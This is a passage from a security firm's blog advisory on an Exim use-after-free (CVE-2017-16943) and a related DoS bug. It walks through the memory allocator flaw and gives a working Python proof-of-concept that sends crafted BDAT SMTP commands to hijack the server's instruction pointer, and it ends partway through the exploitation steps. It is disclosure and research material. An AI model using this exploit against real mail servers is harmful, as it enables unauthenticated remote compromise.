

<!DOCTYPE html>
<html class="no-js sub-menu">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta charset="utf-8" />
    <link href="/images/favicon.png" rel="icon" size="32x32">
    <!-- web fullscreen -->
    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
    <meta name="format-detection" content="telephone=no">
    <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE</title>
    <link rel="stylesheet" href="/css/style.css" />
    <script src="/js/modernizr-custom.js"></script>
    <script src="/js/jquery-3.6.0.min.js"></script>
    <script src="/js/site.js"></script>
    <meta name="description" property="og:description" content="On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability." />
    <meta name="keywords" content="Advisory, Exim, RCE, CVE" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://devco.re/assets/img/blog/20171211/cover.png" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20171211/cover.png">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />
    <meta property="fb:admins" content="120968921404653" />

    <link rel="canonical" href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-GHXJ9PS005');
    </script>
    <link rel="stylesheet" href="/fonts/inter.css" />
    <link rel="stylesheet" href="/css/highlighter.css" />
    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
</head>
<body class="en">
    <!-- 導覽列 start -->
    <header class="header">
<div class="container">
    <!-- logo start -->
    <div class="logo">
        <a href="/en/">
            <img src="/images/logo.svg"/>
        </a>
    </div>
    <!-- logo end -->
    <!-- 主選單 start -->
    <nav class="nav">
        <ul class="menu">
            <li class="dropdown">
                <div class="menuLable">
                    <span>Services<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/services/red-team/">
                            <div class="item">

                                <h2>
                                    <i class="icon menu service-red-team"></i>
                                    Red Team Assessment
                                </h2>
                                <p class="two-line">
                                    Perform comprehensive attack simulation from unlimited aspects to achieve the designated drill scenario without impacting enterprise operations.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/penetration-test/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-penetration-test"></i>
                                    Penetration Testing
                                </h2>
                                <p class="two-line">
                                    Infiltrate designated enterprise systems with hacker mindset and techniques to uncover potential vulnerabilities, assessing the risk of breach or damage to enterprise assets.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-consulting/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-consulting"></i>
                                    Security Consulting
                                </h2>
                                <p class="two-line">
                                    Assist enterprises in resource distribution and long-term defensive strategy development from the attacker's perspective based on red team assessment.
                                </p>
                            </div>
                        </a>
                        <a href="/en/services/security-training/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu service-security-training"></i>
                                    Security Training
                                </h2>
                                <p class="two-line">
                                    Assist enterprises in defending and preventing incidents efficiently from the attacker's perspective, including response procedures and analysis of attack targets, techniques, and vulnerabilities.
                                </p>
                            </div>
                        </a>

                    </div>
                </div>
            </li>

            <li class="dropdown">
                <div class="menuLable">
                    <span>Research<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/research/overview/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu search-circle"></i>
                                    Overview
                                </h2>
                                <p class="two-line">
                                    Research leading cybersecurity techniques and trends, perform comprehensive security assessments of enterprise products, and evolve the red team with broad experience.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/awards/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu badge-check"></i>
                                    Competitions and Awards
                                </h2>
                                <p class="two-line">
                                    Awards from international cybersecurity competitions.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/bug-bounty/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu puzzle"></i>
                                    Enterprise Vulnerability Reports
                                </h2>
                                <p class="two-line">
                                    Research into the risk of enterprise systems, identify potential weaknesses, and report to vendors.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/talks/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu globe"></i>
                                    International Conferences
                                </h2>
                                <p class="two-line">
                                    Publish vulnerability research and share security knowledge at international cybersecurity conferences.
                                </p>
                            </div>
                        </a>
                        <a href="/en/research/cve/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu view-list"></i>
                                    CVE List
                                </h2>
                                <p class="two-line">
                                    Uncover and report critical vulnerabilities in leading international products and services.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>


            </li>

            <li class="dropdown">
                <div class="menuLable" href="#">
                    <span>Company<i class="icon arrow_down"></i></span>

                    <div class="menuItem">
                        <a href="/en/company/about/">
                        <div class="item">
                            <h2>
                                <i class="icon menu company"></i>
                                Company Overview
                            </h2>
                            <p>
                                DEVCORE was founded by a world-class white hat hacker team, providing cybersecurity services and focusing on Red Team Assessment and Penetration Testing services.
                            </p>
                        </div>
                        </a>
                        <a href="/en/company/our-team/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu team"></i>
                                    Team Members
                                </h2>
                                <p class="two-line">
                                    A team of experts with a hacker mindset, exploring new exploitation techniques, and upholding strict morality, self-discipline, and caution.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/history/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu milestone"></i>
                                    Achievements
                                </h2>
                                <p class="two-line">
                                    The history, research achievements, and award information of DEVCORE.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/csr/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu heart"></i>
                                    Corporate Social Responsibility
                                </h2>
                                <p class="two-line">
                                    Provide diverse internship channels and scholarship programs to nurture the next generation and promote cybersecurity awareness.
                                </p>
                            </div>
                        </a>
                        <a href="/en/company/jobs/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu briefcase"></i>
                                    Job Opportunities
                                </h2>
                                <p class="two-line">
                                    Join us to secure the world and improve the cybersecurity industry together.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li class="dropdown">
                <div class="menuLable">
                    <span>News<i class="icon arrow_down"></i></span>
                    <div class="menuItem">
                        <a href="/en/blog/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu newspaper"></i>
                                    BLOG
                                </h2>
                                <p>
                                    Latest news
                                </p>
                            </div>
                        </a>
                        <a href="/en/media-kit/">
                            <div class="item">
                                <h2>
                                    <i class="icon menu download"></i>
                                    Media Resources
                                </h2>
                                <p>
                                    Guidelines for the use of the DEVCORE trademark.
                                </p>
                            </div>
                        </a>
                    </div>
                </div>
            </li>
            <li>
                <a class="menuLable" href="/en/search/">Search</a>
            </li>
            <li>
                <a class="menuLable" href="/en/contact/">Contact</a>
            </li>
        </ul>
    </nav>
    <!-- 主選單 end -->
</div>


<!-- 手機板選單  start-->
<nav class="nav-m" id="menu-m">
    <ul class="menu">
        <li>
            <div class="menuLable">
                <span>Services</span>
                <div class="menuItem">
                    <a href="/en/services/red-team/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-red-team"></i>
                                Red Team Assessment
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/penetration-test/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-penetration-test"></i>
                                Penetration Testing
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-consulting/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-consulting"></i>
                                Security Consulting
                            </h2>
                        </div>
                    </a>
                    <a href="/en/services/security-training/" class="fullwidth">
                        <div class="item">
                            <h2>
                                <i class="icon service-security-training"></i>
                                Security Training
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>Research</span>
                <div class="menuItem">
                    <a href="/en/research/overview/" class="fullwidth">
                        <div class="item">
                            <h2>Overview</h2>
                        </div>
                    </a>
                    <a href="/en/research/awards/">
                        <div class="item">
                            <h2>Competitions and Awards</h2>
                        </div>
                    </a>
                    <a href="/en/research/bug-bounty/">
                        <div class="item">
                            <h2>Enterprise Vulnerability Reports</h2>
                        </div>
                    </a>
                    <a href="/en/research/talks/">
                        <div class="item">
                            <h2>International Conferences</h2>
                        </div>
                    </a>
                    <a href="/en/research/cve/">
                        <div class="item">
                            <h2>CVE List</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>

        <li>
            <div class="menuLable">
                <span>Company</span>
                <div class="menuItem">
                    <a href="/en/company/about/" class="fullwidth">
                        <div class="item">
                            <h2>Company Overview</h2>
                        </div>
                    </a>
                    <a href="/en/company/our-team/">
                        <div class="item">
                            <h2>Team Members</h2>
                        </div>
                    </a>
                    <a href="/en/company/history/">
                        <div class="item">
                            <h2>Achievements</h2>
                        </div>
                    </a>
                    <a href="/en/company/csr/">
                        <div class="item">
                            <h2>Corporate Social Responsibility</h2>
                        </div>
                    </a>
                    <a href="/en/company/jobs/">
                        <div class="item">
                            <h2>Job Opportunities</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span>News</span>
                <div class="menuItem">
                    <a href="/en/blog/">
                        <div class="item">
                            <h2>BLOG</h2>
                        </div>
                    </a>
                    <a href="/en/media-kit/">
                        <div class="item">
                            <h2>Media Resources</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <div class="menuItem">
                    <a href="/en/search/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon search"></i>
                                Search
                            </h2>
                        </div>
                    </a>
                    <a href="/en/contact/" class="fullwidth">
                        <div class="item">
                            <h2 class="center">
                                <i class="icon chat-alt"></i>
                                Contact
                            </h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
        <li>
            <div class="menuLable">
                <span><i class="icon translate"></i>Language</span>
                <div class="menuItem">
                    <a href="/">
                    <div class="item">
                        <h2>中文</h2>
                    </div>
                    </a>
                    <a href="/en">
                        <div class="item">
                            <h2>English</h2>
                        </div>
                    </a>
                </div>
            </div>
        </li>
    </ul>
</nav>
<!-- 手機板選單  end-->
    </header>
    <!-- 導覽列 end -->

    <!-- tab 選單 start -->
    <div class="sub-nav">
        <div class="container">
            <h1>BLOG</h1>
            <ul class="tab">
                <li>
                    <a href="/en/blog/">All Articles</a>
                </li>
                <li>
                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
                </li>
                <li>
                    <a href="/en/media-kit/">Media Resources</a>
                </li>
            </ul>
        </div>
    </div>
    <!-- tab 選單 end -->
    
    <div class="main">
        <!-- 文章外層layer -->
        <section class="narrow">
            <!-- 文章 start -->
            <article class="article_body">
                <div class="content">
                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
                    <span class="tag">

                      <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/Exim/">#Exim</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/CVE/">#CVE</a> 
                    </span>
                    <h1>
                        Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA
                    </h1>
                    
                    
                    <div class="author_detail">
                        <span class="avatar">
                            <a href="/en/blog/author/meh">
                                <div class="circle">
                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/meh.png');" ></i>
                                </div>
                            </a>
                        </span>
                        <span class="author"><a href="/en/blog/author/meh">Meh</a></span>
                        <span class="date">2017-12-11</span>
                    </div>
                    
                    
                    <div class="article_img">
                        <img src="https://devco.re/assets/img/blog/20171211/cover.png"/>
                    </div>
                    

                    <hr>

                    <!-- 文章內容 -->
                    <div class="article_content">
<p>On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.</p>

<h2 id="about-exim">About Exim</h2>
<p>Exim is a message transfer agent (MTA) used on Unix systems. Exim is an open source project and is the default MTA on Debian GNU/Linux systems. According to our survey, there are about 600k SMTP servers running exim on 21st November, 2017 (data collected from scans.io). Also, a <a href="http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html">mail server survey</a> by E-Soft Inc. shows over half of the mail servers identified are running exim.</p>

<h2 id="affected">Affected</h2>
<ul>
  <li>Exim version 4.88 &amp; 4.89 with chunking option enabled.</li>
  <li>According to our survey, about 150k servers affected on 21st November, 2017 (data collected from scans.io).</li>
</ul>

<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>Through our research, the following vulnerabilies were discovered in Exim. Both vulnerabilies involve in BDAT command. BDAT is an extension in SMTP protocol, which is used to transfer large and binary data. A BDAT command is like <code class="language-plaintext highlighter-rouge">BDAT 1024</code> or <code class="language-plaintext highlighter-rouge">BDAT 1024 LAST</code>. With the SIZE and LAST declared, mail servers do not need to scan for the end dot anymore. This command was introduced to exim in version 4.88, and also brought some bugs.</p>
<ul>
  <li>Use-after-free in receive_msg leads to RCE (CVE-2017-16943)</li>
  <li>Incorrect BDAT data handling leads to DoS  (CVE-2017-16944)</li>
</ul>

<h1 id="use-after-free-in-receive_msg-leads-to-rce">Use-after-free in receive_msg leads to RCE</h1>

<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
<p>To explain this bug, we need to start with the memory management of exim. There is a series of functions starts with <code class="language-plaintext highlighter-rouge">store_</code> such as <code class="language-plaintext highlighter-rouge">store_get</code>, <code class="language-plaintext highlighter-rouge">store_release</code>, <code class="language-plaintext highlighter-rouge">store_reset</code>. These functions are used to manage dynamically allocated memory and improve performance. Its architecture is like the illustration below:
<img src="/assets/img/blog/20171211/1.png" alt="architecture of storeblock" /></p>

<p>Initially, exim allocates a big storeblock (default 0x2000) and then cut it into <strong>stores</strong> when <code class="language-plaintext highlighter-rouge">store_get</code> is called, using global pointers to record the size of unused memory and where to cut in next allocation. Once the <code class="language-plaintext highlighter-rouge">current_block</code> is insufficient, it allocates a new block and appends it to the end of the chain, which is a linked list, and then makes <code class="language-plaintext highlighter-rouge">current_block</code> point to it. Exim maintains three <code class="language-plaintext highlighter-rouge">store_pool</code>, that is, there are three chains like the illustration above and every global variables are actually arrays.
This vulnerability is in <code class="language-plaintext highlighter-rouge">receive_msg</code> where exim reads headers: 
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1817">receive.c: 1817 receive_msg</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">&gt;=</span> <span class="n">header_size</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="kt">int</span> <span class="n">oldsize</span> <span class="o">=</span> <span class="n">header_size</span><span class="p">;</span>
    <span class="cm">/* header_size += 256; */</span>
    <span class="n">header_size</span> <span class="o">*=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">store_extend</span><span class="p">(</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">oldsize</span><span class="p">,</span> <span class="n">header_size</span><span class="p">))</span>
      <span class="p">{</span>
      <span class="n">uschar</span> <span class="o">*</span><span class="n">newtext</span> <span class="o">=</span> <span class="n">store_get</span><span class="p">(</span><span class="n">header_size</span><span class="p">);</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">newtext</span><span class="p">,</span> <span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
      <span class="n">store_release</span><span class="p">(</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">);</span>
      <span class="n">next</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">newtext</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to <strong>extend</strong> store, the function <code class="language-plaintext highlighter-rouge">store_extend</code> checks whether the old store is the latest store allocated in <code class="language-plaintext highlighter-rouge">current_block</code>. It returns False immediately if the check is failed.
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276">store.c: 276 store_extend</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">CS</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">rounded_oldsize</span> <span class="o">!=</span> <span class="n">CS</span> <span class="p">(</span><span class="n">next_yield</span><span class="p">[</span><span class="n">store_pool</span><span class="p">])</span> <span class="o">||</span>
    <span class="n">inc</span> <span class="o">&gt;</span> <span class="n">yield_length</span><span class="p">[</span><span class="n">store_pool</span><span class="p">]</span> <span class="o">+</span> <span class="n">rounded_oldsize</span> <span class="o">-</span> <span class="n">oldsize</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</code></pre></div></div>
<p>Once <code class="language-plaintext highlighter-rouge">store_extend</code> fails, exim tries to get a new store and release the old one. After we look into  <code class="language-plaintext highlighter-rouge">store_get</code> and store_release, we found that <code class="language-plaintext highlighter-rouge">store_get</code> returns a <strong>store</strong>, but <code class="language-plaintext highlighter-rouge">store_release</code> releases a <strong>block</strong> if the store is at the head of it. That is to say, if <code class="language-plaintext highlighter-rouge">next-&gt;text</code> points to the start the <code class="language-plaintext highlighter-rouge">current_block</code> and <code class="language-plaintext highlighter-rouge">store_get</code> cuts store inside it for <code class="language-plaintext highlighter-rouge">newtext</code>, then <code class="language-plaintext highlighter-rouge">store_release(next-&gt;text)</code> frees <code class="language-plaintext highlighter-rouge">next-&gt;text</code>, which is equal to <code class="language-plaintext highlighter-rouge">current_block</code>, and leaves <code class="language-plaintext highlighter-rouge">newtext</code> and <code class="language-plaintext highlighter-rouge">current_block</code> pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call <code class="language-plaintext highlighter-rouge">store_get</code> after <code class="language-plaintext highlighter-rouge">next-&gt;text</code> is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes <code class="language-plaintext highlighter-rouge">store_get</code> reachable and finally leads to an RCE.
Exim uses <a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136">function pointers</a> to switch between different input sources, such as <code class="language-plaintext highlighter-rouge">receive_getc</code>, <code class="language-plaintext highlighter-rouge">receive_getbuf</code>. When receiving BDAT data, <code class="language-plaintext highlighter-rouge">receive_getc</code> is set to <code class="language-plaintext highlighter-rouge">bdat_getc</code> in order to check left chunking data size and to handle following command of BDAT. In <code class="language-plaintext highlighter-rouge">receive_msg</code>, exim also uses <code class="language-plaintext highlighter-rouge">receive_getc</code>. It loops to read data, and stores data into <code class="language-plaintext highlighter-rouge">next-&gt;text</code>, extends if insufficient.
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789">receive.c: 1817 receive_msg</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(;;)</span>
  <span class="p">{</span>
  <span class="kt">int</span> <span class="n">ch</span> <span class="o">=</span> <span class="p">(</span><span class="n">receive_getc</span><span class="p">)(</span><span class="n">GETC_BUFFER_UNLIMITED</span><span class="p">);</span>
  
  <span class="cm">/* If we hit EOF on a SMTP connection, it's an error, since incoming
  SMTP must have a correct "." terminator. */</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span> <span class="o">&amp;&amp;</span> <span class="n">smtp_input</span> <span class="cm">/* &amp;&amp; !smtp_batched_input */</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="n">smtp_reply</span> <span class="o">=</span> <span class="n">handle_lost_connection</span><span class="p">(</span><span class="n">US</span><span class="s">" (header)"</span><span class="p">);</span>
    <span class="n">smtp_yield</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">TIDYUP</span><span class="p">;</span>                       <span class="cm">/* Skip to end of function */</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>In <code class="language-plaintext highlighter-rouge">bdat_getc</code>, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. 
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628">smtp_in.c: 628 bdat_getc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">case</span> <span class="n">BDAT_CMD</span><span class="p">:</span>
      <span class="p">{</span>
      <span class="kt">int</span> <span class="n">n</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">sscanf</span><span class="p">(</span><span class="n">CS</span> <span class="n">smtp_cmd_data</span><span class="p">,</span> <span class="s">"%u %n"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunking_datasize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">synprot_error</span><span class="p">(</span><span class="n">L_smtp_protocol_error</span><span class="p">,</span> <span class="mi">501</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="n">US</span><span class="s">"missing size for BDAT command"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ERR</span><span class="p">;</span>
  <span class="p">}</span>
</code></pre></div></div>
<p>In exim, it usually calls <code class="language-plaintext highlighter-rouge">synprot_error</code> to raise error message, which also logs at the same time.
<a href="https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984">smtp_in.c: 628 bdat_getc</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
<span class="nf">synprot_error</span><span class="p">(</span><span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">code</span><span class="p">,</span> <span class="n">uschar</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">uschar</span> <span class="o">*</span><span class="n">errmess</span><span class="p">)</span>
<span class="p">{</span>
<span class="kt">int</span> <span class="n">yield</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">log_write</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">LOG_MAIN</span><span class="p">,</span> <span class="s">"SMTP %s error in </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s"> %s %s"</span><span class="p">,</span>
  <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">L_smtp_syntax_error</span><span class="p">)</span><span class="o">?</span> <span class="s">"syntax"</span> <span class="o">:</span> <span class="s">"protocol"</span><span class="p">,</span>
  <span class="n">string_printing</span><span class="p">(</span><span class="n">smtp_cmd_buffer</span><span class="p">),</span> <span class="n">host_and_ident</span><span class="p">(</span><span class="n">TRUE</span><span class="p">),</span> <span class="n">errmess</span><span class="p">);</span>
</code></pre></div></div>
<p>The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as <code class="language-plaintext highlighter-rouge">'\n'-&gt;'\\n'</code>. Therefore, it asks <code class="language-plaintext highlighter-rouge">store_get</code> for memory to store strings.
This store makes <code class="language-plaintext highlighter-rouge">if (!store_extend(next-&gt;text, oldsize, header_size))</code> in <code class="language-plaintext highlighter-rouge">receive_msg</code> failed when next extension occurs and then triggers use-after-free.</p>

<h3 id="exploitation">Exploitation</h3>
<p>The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when <strong>dkim</strong> is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"EHLO test"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"250 HELP"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"MAIL FROM:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"RCPT TO:&lt;meh@some.domain&gt;"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x1250</span><span class="o">+</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'BDAT 1'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">':BDAT </span><span class="se">\x7f</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1e00</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">+</span> <span class="s">':</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'command'</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<ol>
  <li>Running out of <code class="language-plaintext highlighter-rouge">current_block</code>
 In order to achieve code execution, we need to make the <code class="language-plaintext highlighter-rouge">next-&gt;text</code> get the first store of a block. That is, running out of <code class="language-plaintext highlighter-rouge">current_block</code> and making <code class="language-plaintext highlighter-rouge">store_get</code> allocate a new block. Therefore, we send a long message <code class="language-plaintext highlighter-rouge">'a'*0x1250+'\x7f'</code> with an unprintable character to cut <code class="language-plaintext highlighter-rouge">current_block</code>, making <code class="language-plaintext highlighter-rouge">yield_length</code> less than 0x100.
 <img src="/assets/img/blog/20171211/2.png" alt="" /></li>
  <li>Starts BDAT data transfer
